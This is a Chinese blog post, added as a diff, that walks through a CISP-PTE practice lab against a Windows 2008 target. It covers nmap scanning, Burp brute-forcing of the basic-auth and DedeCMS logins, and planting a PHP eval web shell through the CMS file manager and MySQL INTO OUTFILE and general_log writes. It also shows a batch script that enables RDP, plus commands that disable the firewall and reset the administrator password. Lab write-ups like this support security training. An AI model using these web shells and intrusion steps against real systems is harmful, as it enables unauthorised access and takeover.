@@ -1,0 +1,347 @@
+---
+layout: post
+title: CISP-PTE win2008 靶场
+subtitle: CISP-PTE win2008 靶场
+date: 2025-08-16 10:38
+author: Kyon-H
+header-img: img/post-bg-2015.jpg
+tags:
+  - 靶场实战
+number headings: first-level 2, max 4, 1.1., auto
+published: true
+---
+## 1. 靶场环境
+
+![Pasted%20image%2020250816103937.png](https://img.ghostliner.top/RVwOKc.png)
+
+## 2. 信息搜集
+
+nmap 扫描存活主机，发现主机 `192.168.163.130`
+
+```shell
+nmap -sn 192.168.163.0/24
+```
+
+![Pasted%20image%2020250816104405.png](https://img.ghostliner.top/UfcipR.png)
+
+扫描端口
+
+```shell
+namp -sS -p- -T5 192.168.163.130
+```
+
+![image.png](https://img.ghostliner.top/9Do2RF.png)
+
+发现 http 站点和 mysql 数据库
+
+**访问站点**
+
+弹出登录框
+![295](https://img.ghostliner.top/CrRsFf.png)
+
+bp 抓包查看，发现 base64 编码的认证头
+
+![image20250816105550.png](https://img.ghostliner.top/kmSFJS.png)
+
+解码发现为输入的用户名密码
+
+![Pasted%20image%2020250816105613.png](https://img.ghostliner.top/3adqkT.png)
+
+## 3. 登录页面爆破
+
+发送到 `Intruder`，构造 payload
+
+![Pasted%20image%2020250816105754.png](https://img.ghostliner.top/yBKpjw.png)
+
+参数设置
+
+![391](https://img.ghostliner.top/8gED7n.png)
+
+位置 2 配置
+
+![411](https://img.ghostliner.top/wtdoad.png)
+
+选择 base64 编码
+
+![Pasted%20image%2020250816110705.png](https://img.ghostliner.top/hfRwiL.png)
+
+取消勾选 URL 编码
+
+![Pasted%20image%2020250816110352.png](https://img.ghostliner.top/Gwqzxb.png)
+
+**开始攻击**
+
+过滤 status code
+
+![Pasted%20image%2020250816110801.png](https://img.ghostliner.top/dVutH8.png)
+
+![Pasted%20image%2020250816110820.png](https://img.ghostliner.top/MaDqeI.png)
+
+`YWRtaW46MTIzNDU2` 解码得到 `admin:123456`
+
+![239](https://img.ghostliner.top/BdJsG2.png)
+
+###### 获取到 key1
+
+登录后弹出提示框显示 key
+
+![412](https://img.ghostliner.top/zFjs6D.png)
+
+### 3.2. bp 目录遍历
+
+设置 payload
+
+![Pasted%20image%2020250816111217.png](https://img.ghostliner.top/15EdFN.png)
+
+添加字典
+
+![image.png396](https://img.ghostliner.top/7CMJHG.png)
+
+![Pasted%20image%2020250816110352.png495](https://img.ghostliner.top/Gwqzxb.png)
+
+![image.png351](https://img.ghostliner.top/xDUb9N.png)
+
+```
+/dede/login.php # 织梦默认后台路径
+/member/login.php # 网站登录路径
+/member/reg_new.php # 网站注册路径
+/phpmyadmin/index.php # phpmyadmin登录页面
+```
+
+## 4. 访问织梦后台
+
+使用 123:123 登录提示：用户名不存在
+
+![image.png412](https://img.ghostliner.top/b0jUKt.png)
+
+使用 admin:123456 登录提示：密码错误
+
+![image.png407](https://img.ghostliner.top/O6vUyX.png)
+
+说明存在用户：admin
+
+#### 4.1.1. bp 爆破密码
+
+重新获取一次验证码填入 `validate`，设置 pwd 为 payload
+
+![image.png](https://img.ghostliner.top/mLNK4Z.png)
+
+载入字典
+
+![image.png](https://img.ghostliner.top/PYTK6n.png)
+
+攻击结果：
+
+![image.png](https://img.ghostliner.top/Nsk2ID.png)
+
+**用户名**：admin
+**密 码**：888888
+
+登录成功，浏览页面，在 `文件式管理器` 发现利用点，可以上传、创建 php 文件
+
+![image.png](https://img.ghostliner.top/dDnIBm.png)
+
+### 4.2. getshell
+
+新建一句话木马文件
+
+![image.png](https://img.ghostliner.top/Uc9H7y.png)
+
+点击文件，访问成功
+
+![image.png](https://img.ghostliner.top/o7VRe2.png)
+
+蚁剑连接
+
+![image.png](https://img.ghostliner.top/U0tZ4e.png)
+
+配置认证头
+
+![image.png](https://img.ghostliner.top/z9Pxt4.png)
+
+连接成功，在网站根目录发现 `key.txt`
+
+###### 获取到 key2
+
+![image.png](https://img.ghostliner.top/HXMzQ6.png)
+
+发现当前用户为 `System`
+
+![image.png](https://img.ghostliner.top/T3btSl.png)
+
+查找 `key.txt`，只找到网站根目录的 key
+
+```batch
+for /r "c:\" %i in (key*.txt*) do echo %i
+```
+
+![image.png](https://img.ghostliner.top/uXtYy0.png)
+
+猜测 key3 在回收站
+
+> [!NOTE]
+>
+> 放入回收站的文件会被改名，且分为两个文件：
+> 一个保存文件原路径，一个保存文件原内容。
+
+查看回收站内容
+
+![image.png](https://img.ghostliner.top/MoWeSa.png)
+
+发现路径文件
+
+![image.png](https://img.ghostliner.top/HAKqM8.png)
+
+###### 获取到 key3
+
+发现 key.txt 文件内容
+
+![image.png](https://img.ghostliner.top/vEpiTS.png)
+
+### 4.3. 开启远程桌面
+
+上传 `3389.bat` 脚本并执行
+
+```batch
+@REM 3389.bat
+echo Windows Registry Editor Version 5.00>>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>>3389.reg
+echo "fDenyTSConnections"=dword:00000000>>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]>>3389.reg
+echo "PortNumber"=dword:00000d3d>>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]>>3389.reg
+echo "PortNumber"=dword:00000d3d>>3389.reg
+regedit /s 3389.reg
+del 3389.reg
+```
+
+![image.png](https://img.ghostliner.top/qFpbei.png)
+
+查看端口开放情况
+
+![image.png](https://img.ghostliner.top/5WZrVk.png)
+
+查看防火墙状态
+
+```batch
+netsh fiewwall show state
+# 禁用防火墙
+netsh firewall set opmod disable
+```
+
+![image.png](https://img.ghostliner.top/pD3vBZ.png)
+
+修改管理员用户密码
+
+```batch
+net user administrator 123456
+```
+
+![image.png](https://img.ghostliner.top/CavsrA.png)
+
+`Win+R` 输入 `mstsc` 连接远程桌面
+
+![image.png](https://img.ghostliner.top/pFHmj7.png)
+
+回收站发现 key
+
+![image.png](https://img.ghostliner.top/tlaykU.png)
+
+## 5. 访问 phpMyadmin
+
+![image.png388](https://img.ghostliner.top/5Dx30h.png)
+
+![7ce726f3ce8719419d6839cf2f672a6.png242](https://img.ghostliner.top/xdhlZA.png)
+
+测试弱密码 `root:root` 登录成功
+
+发现数据库 `dedecmsv56utf` 为织梦数据库
+
+![image.png](https://img.ghostliner.top/FoF7ys.png)
+
+发现 admin 密码：`cca77804d2ba1922c33e`
+
+![image.png](https://img.ghostliner.top/uWUvKu.png)
+
+查看数据库 `dede_member` 中的用户密码
+
+![image.png](https://img.ghostliner.top/VuXdYT.png)
+
+**发现 0001 用户密码与 admin 密码有相似部分，确定 admin 密码格式为 md5 编码截取前 5 位和后 7 位，可以注册用户并替换密码**
+
+获取网站根目录路径
+
+```sql
+show global variables; # 查看配置
+select @@basedir;
+```
+
+![image.png](https://img.ghostliner.top/q2sXzK.png)
+
+发现目录 `C:\phpStudy\`，猜测网站根目录路径：`C:\phpStudy\WWW\`
+
+#### 5.1.1. 利用 OUTFILE getshell
+
+查看权限
+
+```sql
+show global variables like "%priv%";
+```
+
+![image.png](https://img.ghostliner.top/39KEb6.png)
+
+`secure_file_priv` 显示为空，说明可在任意处创建文件
+
+```sql
+select '<?php echo 123;eval($_REQUEST[a]);?>' into outfile 'c:/phpstudy/www/shell.php';
+-- 不能写成 'c:\phpstudy\www\shell.php'
+```
+
+![image.png](https://img.ghostliner.top/OFTgwB.png)
+
+蚁剑连接，配置认证头
+
+![image.png](https://img.ghostliner.top/z9Pxt4.png)
+
+连接成功
+
+![image.png](https://img.ghostliner.top/T3btSl.png)
+
+### 5.2. 利用日志 getshell
+
+**原理**：MySQL 的 general_log、slow_log 可以记录 SQL 语句到文件。通过设置日志路径到 Web 目录，就能写 PHP 代码。
+
+**利用场景**：当没有权限使用 OUTFILE 时可利用 MySQL 日志文件 getshell
+
+查看日志状态：
+
+```sql
+show global variables like '%log%';
+```
+
+![image.png](https://img.ghostliner.top/Sg6Cqa.png)
+
+修改日志配置：
+
+```sql
+set global general_log="ON";
+set global general_log_file="c:/phpstudy/www/shell_log.php";
+```
+
+![image.png](https://img.ghostliner.top/H9aeWj.png)
+
+_注：除了使用命令操作，也可使用可视化界面进行修改。_
+
+注入一句话木马：
+
+```sql
+select '<?php echo 123;eval($_REQUEST[a]);?>';
+-- 关闭日志记录
+set global general_log="OFF";
+```
+
+访问成功：
+
+![image.png548](https://img.ghostliner.top/UmFrQX.png)
+
+蚁剑连接后获取 key
